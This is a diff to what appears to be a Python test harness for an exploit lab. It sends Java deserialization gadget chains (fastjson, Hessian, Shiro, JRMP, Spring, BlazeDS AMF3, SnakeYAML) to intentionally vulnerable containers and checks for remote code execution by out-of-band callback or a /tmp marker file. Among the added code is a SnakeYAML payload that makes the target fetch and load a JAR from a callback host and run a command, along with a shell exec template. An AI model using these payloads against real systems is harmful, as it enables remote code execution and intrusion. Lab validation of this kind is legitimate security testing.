@@ -267,14 +267,14 @@ def test_deser_chain(chain_id, params=None, target_url=None, container_name="vul
         record(chain_id, "SKIP", f"target unreachable: {resp[:80]}")
         return
     ok, ev = wait_callback(tok)
-    if ok:
-        rce_ok = verify_rce_file(container_name, tok)
-        note = f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}"
+    rce_ok = verify_rce_file(container_name, tok)
+    if ok or rce_ok:
+        note = f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}" if ok else "no OOB (file-based RCE)"
         if rce_ok:
             note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
         record(chain_id, "PASS", note)
     else:
-        record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")
+        record(chain_id, "FAIL", f"no OOB callback + no RCE file (deser resp={code}: {resp[:60]})")
 
 def test_deser_jndi_chain(chain_id):
     """For deserialization chains that trigger JNDI (jndi_url param), POST to /deser."""
@@ -343,14 +343,14 @@ def test_hessian_chain(chain_id, version=1):
         record(chain_id, "SKIP", f"vulnlab unreachable")
         return
     ok, ev = wait_callback(tok)
-    if ok:
-        rce_ok = verify_rce_file("vuln-vulnlab", tok)
-        note = f"callback from {ev.get('remote_addr','?')}"
+    rce_ok = verify_rce_file("vuln-vulnlab", tok)
+    if ok or rce_ok:
+        note = f"callback from {ev.get('remote_addr','?')}" if ok else "no OOB (file-based RCE)"
         if rce_ok:
-            note += f" + RCE file ✓"
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
         record(chain_id, "PASS", note)
     else:
-        record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")
+        record(chain_id, "FAIL", f"no OOB callback + no RCE file (resp={code}: {resp[:60]})")
 
 def test_fastjson_chain(chain_id):
     if chain_id in KNOWN_SKIP:
@@ -381,10 +381,14 @@ def test_fastjson_chain(chain_id):
         record(chain_id, "SKIP", "vulnlab unreachable")
         return
     ok, ev = wait_callback(tok)
-    if ok:
-        record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')}")
+    rce_ok = verify_rce_file("vuln-vulnlab", tok)
+    if ok or rce_ok:
+        note = f"callback from {ev.get('remote_addr','?')}" if ok else "no OOB (file-based RCE)"
+        if rce_ok:
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
+        record(chain_id, "PASS", note)
     else:
-        record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")
+        record(chain_id, "FAIL", f"no OOB callback + no RCE file (resp={code}: {resp[:60]})")
 
 def test_xstream_chain(chain_id):
     if chain_id in KNOWN_SKIP:
@@ -498,14 +502,14 @@ def test_shiro(chain_id):
         record(chain_id, "SKIP", f"shiro unreachable: {e}")
         return
     ok, ev = wait_callback(tok)
-    if ok:
-        rce_ok = verify_rce_file("vuln-shiro", tok)
-        note = f"callback from {ev.get('remote_addr','?')}"
+    rce_ok = verify_rce_file("vuln-shiro", tok)
+    if ok or rce_ok:
+        note = f"callback from {ev.get('remote_addr','?')}" if ok else "no OOB (file-based RCE)"
         if rce_ok:
-            note += f" + RCE file ✓"
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
         record(chain_id, "PASS", note)
     else:
-        record(chain_id, "FAIL", f"no callback (http {code})")
+        record(chain_id, "FAIL", f"no OOB callback + no RCE file (http {code})")
 
 def test_jrmp_client(jrmp_port=10099, target_url=None, container_name="vuln-java8old"):
     """
@@ -568,14 +572,14 @@ def test_jrmp_client(jrmp_port=10099, target_url=None, container_name="vuln-java
 
         # Step 4: wait for OOB callback
         ok, ev = wait_callback(tok)
-        if ok:
-            rce_ok = verify_rce_file(container_name, tok)
-            note = f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}"
+        rce_ok = verify_rce_file(container_name, tok)
+        if ok or rce_ok:
+            note = f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}" if ok else "no OOB (file-based RCE)"
             if rce_ok:
-                note += f" + RCE file ✓"
+                note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
             record(chain_id, "PASS", note)
         else:
-            record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")
+            record(chain_id, "FAIL", f"no OOB callback + no RCE file (deser resp={code}: {resp[:60]})")
     finally:
         # Disarm regardless of outcome
         try:
@@ -706,14 +710,14 @@ def test_spring_exec_chain(chain_id, version=1):
         record(chain_id, "SKIP", f"spring3 unreachable")
         return
     ok, ev = wait_callback(tok)
-    if ok:
-        rce_ok = verify_rce_file("vuln-spring3", tok)
-        note = f"callback from {ev.get('remote_addr','?')}"
+    rce_ok = verify_rce_file("vuln-spring3", tok)
+    if ok or rce_ok:
+        note = f"callback from {ev.get('remote_addr','?')}" if ok else "no OOB (file-based RCE)"
         if rce_ok:
-            note += " + RCE file ✓"
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
         record(chain_id, "PASS", note)
     else:
-        record(chain_id, "FAIL", f"no callback (resp={code}: {resp[:60]})")
+        record(chain_id, "FAIL", f"no OOB callback + no RCE file (resp={code}: {resp[:60]})")
 
 
 def test_urldns(chain_id="ysoserial_urldns"):
@@ -970,6 +974,73 @@ def test_all_memshells_generate():
             record(chain_label, "ERR ", f"s={s} keys={list(d.keys())}")
 
 
+def test_snakeyaml_chain():
+    """SnakeYAML RCE via SPI JAR URLClassLoader."""
+    chain_id = "jchains_jndi_snakeyaml"
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
+    cmd = EXEC_CMD(tok)
+    # JAR server URL: spi-jar-server at :8099 serves /rce.jar?cmd=CMD
+    jar_url = f"http://{OOB_HOST}:8099/rce.jar?cmd={urllib.parse.quote(cmd)}"
+    yaml_payload = f"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"{jar_url}\"]]]]"
+    code, resp = post_raw(f"{VULNLAB}/snakeyaml", yaml_payload.encode(), "text/plain")
+    if code == 0:
+        record(chain_id, "SKIP", f"vulnlab unreachable: {resp[:60]}")
+        return
+    ok, ev = wait_callback(tok, timeout=POLL_SEC + 10)
+    rce_ok = verify_rce_file("vuln-vulnlab", tok)
+    if ok or rce_ok:
+        note = f"callback from {ev.get('remote_addr','?')}" if ok else "no OOB (file-based)"
+        if rce_ok:
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
+        record(chain_id, "PASS", note)
+    else:
+        record(chain_id, "FAIL", f"no callback (snakeyaml resp={code}: {resp[:60]})")
+
+
+def test_blazeds_chain():
+    """BlazeDS AMF3 RCE via java-chains jchains_blazeds_axis2."""
+    chain_id = "jchains_blazeds_axis2"
+    BLAZEDS_URL = os.getenv("BLAZEDS_URL", "http://localhost:8896")
+    if not check_target(BLAZEDS_URL, "blazeds :8896"):
+        record(chain_id, "SKIP", "blazeds target not running (:8896)")
+        return
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
+    s, d = generate_payload(chain_id, {"cmd": EXEC_CMD(tok)})
+    if s != 200:
+        record(chain_id, "ERR ", f"generate failed: {d}")
+        return
+    b64 = d.get("value", "")
+    if not b64:
+        record(chain_id, "ERR ", f"no value: {list(d.keys())}")
+        return
+    try:
+        raw = base64.b64decode(b64)
+    except Exception:
+        record(chain_id, "ERR ", "not base64")
+        return
+    code, resp = post_raw(f"{BLAZEDS_URL}/messagebroker/amf", raw, "application/x-amf")
+    if code == 0:
+        record(chain_id, "SKIP", f"blazeds unreachable: {resp[:60]}")
+        return
+    ok, ev = wait_callback(tok)
+    rce_ok = verify_rce_file("vuln-blazeds", tok)
+    if ok or rce_ok:
+        note = f"callback from {ev.get('remote_addr','?')}" if ok else "no OOB"
+        if rce_ok:
+            note += f" + RCE file /tmp/oobx_{tok[:12]} ✓"
+        record(chain_id, "PASS", note)
+    else:
+        record(chain_id, "FAIL", f"no callback (amf resp={code}: {resp[:60]})")
+
+
 # ── Main ───────────────────────────────────────────────────────────────────────
 
 def main():
@@ -1124,8 +1195,11 @@ def main():
 
     # ── Section 9: C3P0 / H2 / BlazeDS ───────────────────────────────────────
     print("\n[*] Section 9: C3P0 / H2 / BlazeDS chains")
-    for cid in ["c3p0_jndi","c3p0_wrapperds","jchains_blazeds_axis2"]:
+    check_target(os.getenv("BLAZEDS_URL", "http://localhost:8896"), "blazeds :8896")
+    for cid in ["c3p0_jndi","c3p0_wrapperds"]:
         test_deser_chain(cid)
+    # BlazeDS AMF3 chain requires dedicated BlazeDS container (:8896)
+    test_blazeds_chain()
     # H2 JDBC chain uses /h2jdbc endpoint (not /deser) with a JDBC URL, not serialized bytes
     test_h2_jdbc("jchains_h2_jdbc")
 
@@ -1166,8 +1240,8 @@ def main():
             '#1#x#Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","__CMD__"});',
         ],
     )
-    # SnakeYAML: SPI JAR approach requires custom remote JAR server (not implemented yet)
-    record("jchains_jndi_snakeyaml", "SKIP", KNOWN_SKIP["jchains_jndi_snakeyaml"])
+    # SnakeYAML: SPI JAR approach — test via spi-jar-server at :8099
+    test_snakeyaml_chain()
 
     # ── Section 11: Memshell generation smoke tests ───────────────────────────
     test_all_memshells_generate()
